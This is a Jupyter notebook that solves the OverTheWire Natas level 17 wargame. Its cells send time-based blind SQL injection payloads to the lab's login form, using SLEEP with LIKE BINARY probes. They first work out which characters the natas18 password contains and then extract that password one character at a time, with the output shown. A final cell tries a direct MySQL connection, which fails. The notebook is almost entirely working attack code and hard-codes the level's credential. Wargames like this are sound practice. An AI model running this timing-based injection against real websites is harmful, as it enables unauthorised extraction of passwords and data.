{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "from requests.auth import HTTPBasicAuth\n",
    "import string\n",
    "import time\n",
    "from datetime import timedelta\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "trying A\n",
      "trying B\n",
      "found B\n",
      "trying C\n",
      "found C\n",
      "trying D\n",
      "found D\n",
      "trying E\n",
      "trying F\n",
      "trying G\n",
      "found G\n",
      "trying H\n",
      "trying I\n",
      "trying J\n",
      "found J\n",
      "trying K\n",
      "found K\n",
      "trying L\n",
      "found L\n",
      "trying M\n",
      "trying N\n",
      "trying O\n",
      "found O\n",
      "trying P\n",
      "found P\n",
      "trying Q\n",
      "trying R\n",
      "found R\n",
      "trying S\n",
      "trying T\n",
      "trying U\n",
      "trying V\n",
      "found V\n",
      "trying W\n",
      "trying X\n",
      "trying Y\n",
      "trying Z\n",
      "found Z\n",
      "trying a\n",
      "trying b\n",
      "found b\n",
      "trying c\n",
      "trying d\n",
      "found d\n",
      "trying e\n",
      "trying f\n",
      "trying g\n",
      "found g\n",
      "trying h\n",
      "trying i\n",
      "trying j\n",
      "found j\n",
      "trying k\n",
      "trying l\n",
      "found l\n",
      "trying m\n",
      "trying n\n",
      "trying o\n",
      "trying p\n",
      "found p\n",
      "trying q\n",
      "trying r\n",
      "trying s\n",
      "trying t\n",
      "trying u\n",
      "trying v\n",
      "trying w\n",
      "trying x\n",
      "found x\n",
      "trying y\n",
      "found y\n",
      "trying z\n",
      "trying 0\n",
      "trying 1\n",
      "found 1\n",
      "trying 2\n",
      "trying 3\n",
      "trying 4\n",
      "found 4\n",
      "trying 5\n",
      "trying 6\n",
      "found 6\n",
      "trying 7\n",
      "trying 8\n",
      "trying 9\n",
      "BCDGJKLOPRVZbdgjlpxy146\n"
     ]
    }
   ],
   "source": [
    "possible_chars = string.ascii_uppercase+string.ascii_lowercase+string.digits\n",
    "found_chars = ''\n",
    "\n",
    "for possible_char in possible_chars:\n",
    "    print('trying',possible_char)\n",
    "    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug',data={'username': 'natas18\" and password like binary \"%'+possible_char+'%\" AND  SLEEP(0.5) or \"2\"=\"1 '},auth=HTTPBasicAuth(username='natas17',password='EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'))\n",
    "    if r.elapsed > timedelta(seconds=0.5) :\n",
    "        found_chars += possible_char\n",
    "        print('found',possible_char)\n",
    "    time.sleep(0.1)\n",
    "print(found_chars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pass 6\n",
      "pass 6O\n",
      "pass 6OG\n",
      "pass 6OG1\n",
      "pass 6OG1P\n",
      "pass 6OG1Pb\n",
      "pass 6OG1PbK\n",
      "pass 6OG1PbKd\n",
      "pass 6OG1PbKdV\n",
      "pass 6OG1PbKdVj\n",
      "pass 6OG1PbKdVjy\n",
      "pass 6OG1PbKdVjyB\n",
      "pass 6OG1PbKdVjyBl\n",
      "pass 6OG1PbKdVjyBlp\n",
      "pass 6OG1PbKdVjyBlpx\n",
      "pass 6OG1PbKdVjyBlpxg\n",
      "pass 6OG1PbKdVjyBlpxgD\n",
      "pass 6OG1PbKdVjyBlpxgD4\n",
      "pass 6OG1PbKdVjyBlpxgD4D\n",
      "pass 6OG1PbKdVjyBlpxgD4DD\n",
      "pass 6OG1PbKdVjyBlpxgD4DDb\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbR\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6Z\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZL\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZLl\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZLlC\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC\n",
      "pass 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n"
     ]
    }
   ],
   "source": [
    "found_chars = 'BCDGJKLOPRVZbdgjlpxy146'\n",
    "password = \"\"\n",
    "\n",
    "while len(password) < 32:\n",
    "    for char in found_chars:\n",
    "        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug',data={'username': 'natas18\" and password like binary \"'+password+char+'%\" AND  SLEEP(0.5) or \"2\"=\"1 '},auth=HTTPBasicAuth(username='natas17',password='EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'))\n",
    "        if r.elapsed > timedelta(seconds=0.5) :\n",
    "            password += char\n",
    "            break\n",
    "            print('pass', password)\n",
    "        # time.sleep(0.1)\n",
    "print(password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0:00:00.578161\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas17\", \"pass\": \"EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\" };</script></head>\n",
      "<body>\n",
      "<h1>natas17</h1>\n",
      "<div id=\"content\">\n",
      "Executing query: SELECT * from users where username=\"natas18\" and SLEEP(0.5) or \"2\"=\"1\"<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug',data={'username': 'natas18\" and SLEEP(0.5) or \"2\"=\"1'},auth=HTTPBasicAuth(username='natas17',password='EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'))\n",
    "print(r.elapsed)\n",
    "print(r.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "import mysql"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "ename": "InterfaceError",
     "evalue": "2003: Can't connect to MySQL server on 'natas17.natas.labs.overthewire.org:2220' (10060 A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTimeoutError\u001b[0m                              Traceback (most recent call last)",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python312\\site-packages\\mysql\\connector\\network.py:758\u001b[0m, in \u001b[0;36mMySQLTCPSocket.open_connection\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    757\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39msock\u001b[38;5;241m.\u001b[39msettimeout(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_connection_timeout)\n\u001b[1;32m--> 758\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msock\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mconnect\u001b[49m\u001b[43m(\u001b[49m\u001b[43msockaddr\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m    759\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mIOError\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m err:\n",
      "\u001b[1;31mTimeoutError\u001b[0m: [WinError 10060] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond",
      "\nThe above exception was the direct cause of the following exception:\n",
      "\u001b[1;31mInterfaceError\u001b[0m                            Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[26], line 1\u001b[0m\n\u001b[1;32m----> 1\u001b[0m cnx \u001b[38;5;241m=\u001b[39m \u001b[43mmysql\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mconnector\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mconnect\u001b[49m\u001b[43m(\u001b[49m\u001b[43muser\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mnatas17\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mpassword\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mEqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\n\u001b[0;32m      2\u001b[0m \u001b[43m                              \u001b[49m\u001b[43mhost\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mnatas17.natas.labs.overthewire.org\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mport\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43m2220\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\n\u001b[0;32m      3\u001b[0m \u001b[43m                              \u001b[49m\u001b[43mdatabase\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mnatas17\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[0;32m      5\u001b[0m cnx\u001b[38;5;241m.\u001b[39mclose()\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python312\\site-packages\\mysql\\connector\\pooling.py:323\u001b[0m, in \u001b[0;36mconnect\u001b[1;34m(*args, **kwargs)\u001b[0m\n\u001b[0;32m    321\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m CMySQLConnection \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m use_pure:\n\u001b[0;32m    322\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m CMySQLConnection(\u001b[38;5;241m*\u001b[39margs, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n\u001b[1;32m--> 323\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mMySQLConnection\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python312\\site-packages\\mysql\\connector\\connection.py:179\u001b[0m, in \u001b[0;36mMySQLConnection.__init__\u001b[1;34m(self, **kwargs)\u001b[0m\n\u001b[0;32m    177\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m kwargs:\n\u001b[0;32m    178\u001b[0m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m--> 179\u001b[0m         \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mconnect\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[38;5;241;43m*\u001b[39;49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m    180\u001b[0m     \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mException\u001b[39;00m:\n\u001b[0;32m    181\u001b[0m         \u001b[38;5;66;03m# Tidy-up underlying socket on failure\u001b[39;00m\n\u001b[0;32m    182\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mclose()\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python312\\site-packages\\mysql\\connector\\abstracts.py:1399\u001b[0m, in \u001b[0;36mMySQLConnectionAbstract.connect\u001b[1;34m(self, **kwargs)\u001b[0m\n\u001b[0;32m   1396\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mconfig(\u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n\u001b[0;32m   1398\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mdisconnect()\n\u001b[1;32m-> 1399\u001b[0m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_open_connection\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m   1401\u001b[0m charset, collation \u001b[38;5;241m=\u001b[39m (\n\u001b[0;32m   1402\u001b[0m     kwargs\u001b[38;5;241m.\u001b[39mpop(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mcharset\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m),\n\u001b[0;32m   1403\u001b[0m     kwargs\u001b[38;5;241m.\u001b[39mpop(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mcollation\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m),\n\u001b[0;32m   1404\u001b[0m )\n\u001b[0;32m   1405\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m charset \u001b[38;5;129;01mor\u001b[39;00m collation:\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python312\\site-packages\\mysql\\connector\\connection.py:357\u001b[0m, in \u001b[0;36mMySQLConnection._open_connection\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    355\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_socket \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_get_connection()\n\u001b[0;32m    356\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m--> 357\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_socket\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mopen_connection\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m    359\u001b[0m     \u001b[38;5;66;03m# do initial handshake\u001b[39;00m\n\u001b[0;32m    360\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_do_handshake()\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python312\\site-packages\\mysql\\connector\\network.py:760\u001b[0m, in \u001b[0;36mMySQLTCPSocket.open_connection\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    758\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39msock\u001b[38;5;241m.\u001b[39mconnect(sockaddr)\n\u001b[0;32m    759\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mIOError\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m err:\n\u001b[1;32m--> 760\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m InterfaceError(\n\u001b[0;32m    761\u001b[0m         errno\u001b[38;5;241m=\u001b[39m\u001b[38;5;241m2003\u001b[39m,\n\u001b[0;32m    762\u001b[0m         values\u001b[38;5;241m=\u001b[39m(\n\u001b[0;32m    763\u001b[0m             \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mserver_host,\n\u001b[0;32m    764\u001b[0m             \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mserver_port,\n\u001b[0;32m    765\u001b[0m             _strioerror(err),\n\u001b[0;32m    766\u001b[0m         ),\n\u001b[0;32m    767\u001b[0m     ) \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01merr\u001b[39;00m\n\u001b[0;32m    768\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m err:\n\u001b[0;32m    769\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m OperationalError(\u001b[38;5;28mstr\u001b[39m(err)) \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01merr\u001b[39;00m\n",
      "\u001b[1;31mInterfaceError\u001b[0m: 2003: Can't connect to MySQL server on 'natas17.natas.labs.overthewire.org:2220' (10060 A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond)"
     ]
    }
   ],
   "source": [
    "\n",
    "cnx = mysql.connector.connect(user=\"natas17\", password=\"EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\",\n",
    "                              host=\"natas17.natas.labs.overthewire.org\", port=\"2220\",\n",
    "                              database=\"natas17\")\n",
    "\n",
    "cnx.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
